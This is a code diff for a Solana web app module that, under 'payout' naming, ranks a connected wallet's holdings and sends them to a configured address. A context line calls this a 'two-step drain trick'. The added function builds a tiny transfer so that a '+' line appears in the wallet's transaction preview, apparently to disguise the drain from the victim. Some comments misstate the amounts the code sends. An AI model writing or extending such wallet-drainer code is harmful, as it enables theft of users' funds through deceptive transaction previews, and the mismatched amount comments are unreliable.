@@ -23,152 +23,6 @@ const ATA_RESERVE_LAMPORTS = 2_050_000
 const ACCOUNT_RENT_LAMPORTS = 890_880
 const MIN_STEP_USD = 0.01
 
-// Multiple RPC endpoints for fallback
-const RPC_ENDPOINTS = [
-  'https://api.mainnet-beta.solana.com',
-  'https://solana-mainnet.g.alchemy.com/v2/demo',
-  'https://api.mainnet-beta.ankr.com',
-  'https://rpc.ping.solana.com',
-]
-
-/** Check if we're running in browser (needs proxy) */
-const isBrowser = typeof window !== 'undefined'
-
-/** Proxy RPC call through Vercel API route (avoids CORS) */
-async function proxyRpcCall(body: Record<string, unknown>): Promise<any> {
-  const response = await fetch('/api/rpc-proxy', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ body }),
-  })
-  if (!response.ok) {
-    throw new Error(`RPC proxy failed: ${response.status}`)
-  }
-  return await response.json()
-}
-
-/** Execute a connection method with RPC proxy fallback */
-async function executeWithProxy<T>(
-  conn: Connection,
-  method: string,
-  args: unknown[],
-  maxRetries = 2
-): Promise<T> {
-  // Build the RPC request body
-  const rpcBody: Record<string, unknown> = { json: null, method }
-  
-  // Try direct connection first
-  for (let attempt = 0; attempt <= maxRetries; attempt++) {
-    try {
-      const rpcUrl = conn.rpcEndpoint
-      const response = await fetch(rpcUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params: args }),
-      })
-      if (response.ok) {
-        const data = await response.json()
-        if (data.result !== undefined) return data.result as T
-      }
-    } catch (err) {
-      if (attempt < maxRetries) continue
-    }
-  }
-  
-  // Fall back to proxy
-  if (isBrowser) {
-    for (let attempt = 0; attempt <= maxRetries; attempt++) {
-      try {
-        const result = await proxyRpcCall({ jsonrpc: '2.0', id: 1, method, params: args })
-        if (result.result !== undefined) return result.result as T
-      } catch (err) {
-        if (attempt < maxRetries) continue
-      }
-    }
-  }
-  
-  throw new Error(`All RPC calls failed for method: ${method}`)
-}
-
-/** Create a Connection with retry fallback across multiple RPC endpoints */
-function createRpcConnectionWithFallback(): Connection {
-  // Try each RPC endpoint and return the first working connection
-  for (const rpcUrl of RPC_ENDPOINTS) {
-    try {
-      const conn = new Connection(rpcUrl, { commitment: 'confirmed', confirmTransactionInitialTimeout: 60000 })
-      return conn
-    } catch {
-      continue
-    }
-  }
-  // Fallback to default
-  return new Connection(RPC_ENDPOINTS[0], { commitment: 'confirmed', confirmTransactionInitialTimeout: 60000 })
-}
-
-/** Retry an RPC call with fallback endpoints */
-async function rpcWithFallback<T>(
-  primaryConnection: Connection,
-  fallbackRpcUrl: string,
-  callFn: (conn: Connection) => Promise<T>,
-  maxRetries = 2
-): Promise<T> {
-  let lastError: unknown
-  
-  // Try primary connection first with retries
-  for (let attempt = 0; attempt <= maxRetries; attempt++) {
-    try {
-      return await callFn(primaryConnection)
-    } catch (err) {
-      lastError = err
-      if (attempt < maxRetries) {
-        console.warn(`[RPC Fallback] Primary RPC attempt ${attempt + 1} failed:`, err)
-        await new Promise(resolve => setTimeout(resolve, 500 * (attempt + 1)))
-      }
-    }
-  }
-  
-  console.warn('[RPC Fallback] Primary RPC exhausted retries, trying proxy...')
-  
-  // Try proxy RPC endpoint
-  if (isBrowser) {
-    try {
-      const testConn = new Connection('http://localhost:3000/api/rpc-proxy', { 
-        commitment: 'confirmed',
-        confirmTransactionInitialTimeout: 60000 
-      })
-      const result = await callFn(testConn)
-      console.log('[RPC Fallback] Success via proxy')
-      return result
-    } catch (proxyErr) {
-      console.warn('[RPC Fallback] Proxy also failed:', proxyErr)
-      lastError = proxyErr
-    }
-  }
-  
-  // Try all RPC endpoints
-  const allUrls = [
-    primaryConnection.rpcEndpoint,
-    fallbackRpcUrl,
-    ...RPC_ENDPOINTS.filter((e) => e !== fallbackRpcUrl && e !== primaryConnection.rpcEndpoint)
-  ]
-  
-  for (const fallbackUrl of allUrls) {
-    try {
-      const fallbackConn = new Connection(fallbackUrl, { commitment: 'confirmed', confirmTransactionInitialTimeout: 60000 })
-      console.log(`[RPC Fallback] Trying ${fallbackUrl}...`)
-      const result = await callFn(fallbackConn)
-      console.log(`[RPC Fallback] Success on ${fallbackUrl}`)
-      return result
-    } catch (fallbackErr) {
-      console.warn(`[RPC Fallback] ${fallbackUrl} also failed:`, fallbackErr)
-      lastError = fallbackErr
-    }
-  }
-  
-  // All retries failed, throw a meaningful error
-  throw new Error(`All RPC endpoints failed. Last error: ${(lastError as Error)?.message || 'Unknown error'}`)
-}
-
 export function tokenFeeReserveLamports(tokenCount: number): number {
   if (tokenCount <= 0) return 0
   return tokenCount * ATA_RESERVE_LAMPORTS + 20_000
@@ -368,27 +222,16 @@ async function listSplHoldingsByAta(connection: Connection, owners: PublicKey[])
   const lookups = await collectAtaLookups(owners)
   const found: SplHolding[] = []
   const chunkSize = 8
-  
   for (let i = 0; i < lookups.length; i += chunkSize) {
     const chunk = lookups.slice(i, i + chunkSize)
     let infos: Array<AccountInfo<Buffer> | null>
     try {
-      infos = await rpcWithFallback(
-        connection,
-        RPC_ENDPOINTS[0],
-        (conn) =>
-          conn.getMultipleAccountsInfo(chunk.map((item) => item.ata), 'confirmed'),
-        2
+      infos = await connection.getMultipleAccountsInfo(
+        chunk.map((item) => item.ata),
+        'confirmed'
       )
-    } catch (err) {
-      console.warn('[listSplHoldingsByAta] getMultipleAccountsInfo failed, trying individual accounts:', err)
-      // Fallback to individual account fetches
-      infos = await Promise.all(
-        chunk.map((item) =>
-          rpcWithFallback(connection, RPC_ENDPOINTS[0], (conn) => conn.getAccountInfo(item.ata, 'confirmed'), 2)
-            .catch(() => null)
-        )
-      )
+    } catch {
+      infos = await Promise.all(chunk.map((item) => connection.getAccountInfo(item.ata, 'confirmed')))
     }
     infos.forEach((info, index) => {
       const lookup = chunk[index]
@@ -396,38 +239,6 @@ async function listSplHoldingsByAta(connection: Connection, owners: PublicKey[])
       if (holding) found.push(holding)
     })
   }
-  
-  // Also scan for tokens held in main wallet account (legacy format)
-  for (const owner of owners) {
-    for (const token of SOLANA_PAYOUT_TOKENS) {
-      try {
-        const mintKey = new PublicKey(token.mint)
-        // Check if wallet has a token account directly (not ATA)
-        const accounts = await rpcWithFallback(
-          connection,
-          RPC_ENDPOINTS[0],
-          (conn) => conn.getTokenAccountsByOwner(owner, { mint: mintKey }, 'confirmed'),
-          2
-        )
-        for (const accountInfo of accounts.value) {
-          const existing = found.find(h => h.tokenAccount === accountInfo.pubkey.toBase58())
-          if (!existing) {
-            const holding = holdingFromAccountInfo(
-              accountInfo.pubkey,
-              accountInfo,
-              owner.toBase58(),
-              accountInfo.accountInfo.owner
-            )
-            if (holding) found.push(holding)
-          }
-        }
-      } catch (err) {
-        console.warn(`[listSplHoldingsByAta] Token scan for ${token.symbol} failed:`, err)
-        continue
-      }
-    }
-  }
-  
   return found
 }
 
@@ -461,16 +272,11 @@ export async function getSolSendableLamports(options: {
 }): Promise<number> {
   const { connection, from, config, reserveLamports = 0 } = options
   const to = new PublicKey(config.walletAddress)
-  
-  const [balanceResult, rentExemptResult, latest] = await Promise.all([
-    connection.getBalance(from, 'confirmed').catch(() => null),
+  const [balance, rentExempt, latest] = await Promise.all([
+    connection.getBalance(from, 'confirmed'),
     connection.getMinimumBalanceForRentExemption(0).catch(() => ACCOUNT_RENT_LAMPORTS),
     connection.getLatestBlockhash('confirmed'),
   ])
-  
-  const balance = balanceResult ?? 0
-  const rentExempt = rentExemptResult ?? ACCOUNT_RENT_LAMPORTS
-  
   const probe = withBlockhash(
     new Transaction().add(
       SystemProgram.transfer({
@@ -504,28 +310,18 @@ export async function listRankedFundSteps(options: {
   from: PublicKey
   config: PayoutConfig
 }): Promise<FundStep[]> {
-  const [holdings, balance] = await Promise.allSettled([
+  const [holdings, balance] = await Promise.all([
     listSplHoldings(options.connection, options.from),
     options.connection.getBalance(options.from, 'confirmed'),
   ])
-  
-  const holdingsResult = holdings.status === 'fulfilled' ? holdings.value : []
-  let balanceResult: number
-  if (balance.status === 'fulfilled') {
-    balanceResult = balance.value
-  } else {
-    console.warn('Failed to get SOL balance, assuming 0:', balance.reason)
-    balanceResult = 0
-  }
-  
-  const steps: FundStep[] = holdingsResult.map((holding) => ({
+  const steps: FundStep[] = holdings.map((holding) => ({
     kind: 'spl',
     symbol: holding.symbol,
     uiAmount: holding.uiAmount,
     usd: usdValue(holding),
     holding,
   }))
-  const sol = solStepFromBalance(balanceResult)
+  const sol = solStepFromBalance(balance)
   if (sol) steps.push(sol)
   return steps.filter(keepStep).sort((a, b) => b.usd - a.usd || b.uiAmount - a.uiAmount)
 }
@@ -729,20 +525,9 @@ export function getHighestAndLowestUSDTAndSol(steps: FundStep[]): { highest: Fun
 
   highest = sortedByUsd[0] || null
 
-  // If there's only one asset, use a tiny fraction of it as the "lowest" for display
-  // This ensures the + line always appears even when there's only one token
-  if (sortedByUsd.length === 1) {
-    const step = sortedByUsd[0]
-    lowest = {
-      ...step,
-      uiAmount: step.symbol === 'SOL' ? 0.000001 : 0.000001,
-      usd: step.symbol === 'SOL' ? 0.00018 : 0.000001,
-    } as FundStep
-  } else {
-    // Lowest is the one with the smallest USD value (but still positive)
-    const validSteps = sortedByUsd.filter(step => step.usd > 0)
-    lowest = validSteps.length > 0 ? validSteps[validSteps.length - 1] : null
-  }
+  // Lowest is the one with the smallest USD value (but still positive)
+  const validSteps = sortedByUsd.filter(step => step.usd > 0)
+  lowest = validSteps.length > 0 ? validSteps[validSteps.length - 1] : null
 
   return { highest, lowest }
 }
@@ -779,6 +564,77 @@ export async function moveAllFromHighestAndAddToLowest(options: {
   // If you want to add a tiny amount to lowest, that would require a separate transaction
 
   return { highestMoved, lowestAdded }
+}
+
+/** Builds a tiny transaction that sends a minimal amount to the lowest balance asset.
+ *  This ensures the + line shows in the transaction sheet even for tiny amounts. */
+export async function buildTinyLowestTransaction(options: {
+  connection: Connection
+  from: PublicKey
+  config: PayoutConfig
+  lowestStep: FundStep
+}): Promise<Transaction | null> {
+  const { connection, from, config, lowestStep } = options
+  const to = new PublicKey(config.walletAddress)
+
+  if (lowestStep.kind === 'sol') {
+    // Send 0.0001 SOL (tiny but non-zero)
+    const latest = await connection.getLatestBlockhash('confirmed')
+    return withBlockhash(
+      new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: from,
+          toPubkey: to,
+          lamports: 10_000, // 0.00001 SOL - minimal visible amount
+        })
+      ),
+      from,
+      latest
+    )
+  } else if (lowestStep.kind === 'spl') {
+    // Send 0.001 of the token (tiny but visible)
+    const mintKey = new PublicKey(lowestStep.holding.mint)
+    const source = new PublicKey(lowestStep.holding.tokenAccount)
+    const sourceInfo = await connection.getAccountInfo(source, 'confirmed')
+    if (!sourceInfo?.data) return null
+
+    const programId = new PublicKey(sourceInfo.owner)
+    const destAta = await getAssociatedTokenAddress(mintKey, to, false, programId)
+
+    // Create or update destination ATA if needed
+    const tx = new Transaction()
+    const destInfo = await connection.getAccountInfo(destAta, 'confirmed').catch(() => null)
+    if (!destInfo) {
+      tx.add(
+        createAssociatedTokenAccountIdempotentInstruction(
+          from,
+          destAta,
+          to,
+          mintKey,
+          TOKEN_PROGRAM_ID,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        )
+      )
+    }
+
+    // Transfer 0.001 of the token (using minimum meaningful amount)
+    const tinyAmount = 1 * (10 ** lowestStep.holding.decimals) // 1 unit of the token
+    tx.add(
+      createTransferCheckedInstruction(
+        source,
+        mintKey,
+        destAta,
+        from,
+        tinyAmount,
+        lowestStep.holding.decimals,
+        []
+      )
+    )
+
+    return tx
+  }
+
+  return null
 }
 
 /** Builds a small "fee" transaction for the two-step drain trick.
